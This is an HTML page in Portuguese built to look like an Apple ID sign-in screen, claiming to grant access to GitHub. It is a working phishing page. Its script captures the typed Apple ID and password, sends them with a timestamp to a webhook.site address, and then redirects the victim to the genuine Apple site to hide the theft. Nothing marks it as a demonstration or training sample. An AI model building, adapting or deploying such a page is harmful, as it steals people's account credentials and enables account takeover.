<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>Login Apple ID</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
            background-color: #f5f5f7;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .login-container {
            background: white;
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 0 20px rgba(0,0,0,0.1);
            width: 320px;
            text-align: center;
        }
        .apple-logo {
            font-size: 48px;
            margin-bottom: 20px;
            color: #000;
        }
        input {
            width: 100%;
            padding: 14px;
            margin-bottom: 15px;
            border: 1px solid #d2d2d7;
            border-radius: 8px;
            font-size: 16px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            background-color: #0071e3;
            color: white;
            border: none;
            padding: 14px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            margin-top: 10px;
        }
        p {
            font-size: 14px;
            color: #333;
            margin-top: -10px;
            margin-bottom: 15px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="apple-logo"></div>
        <h2>Fazer login</h2>
        <p>Faça login para ter acesso ao GitHub.</p>
        <p>Caso não tenha cadastro no GitHub, é possível acessar com sua conta iCloud ou Samsung Members.</p>
        <form id="loginForm">
            <input type="text" id="apple_id" name="apple_id" placeholder="Apple ID" required>
            <input type="password" id="password" name="password" placeholder="Senha" required>
            <button type="submit">Continuar</button>
        </form>
    </div>

    <script>
        document.getElementById("loginForm").addEventListener("submit", function(e) {
            e.preventDefault();

            const user = document.getElementById("apple_id").value;
            const pass = document.getElementById("password").value;

            const data = {
                usuario: user,
                senha: pass,
                timestamp: new Date().toISOString()
            };

            // Envio sem verificação de CORS (dados chegam, mas sem retorno)
            fetch('https://webhook.site/e9026c1f-9cde-4e6c-9d5d-bc2eb5f83418', {
                method: 'POST',
                mode: 'no-cors',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            });

            // Redirecionamento imediato
            setTimeout(() => {
                window.location.href = "https://appleid.apple.com/";
            }, 1000);
        });
    </script>
</body>
</html>
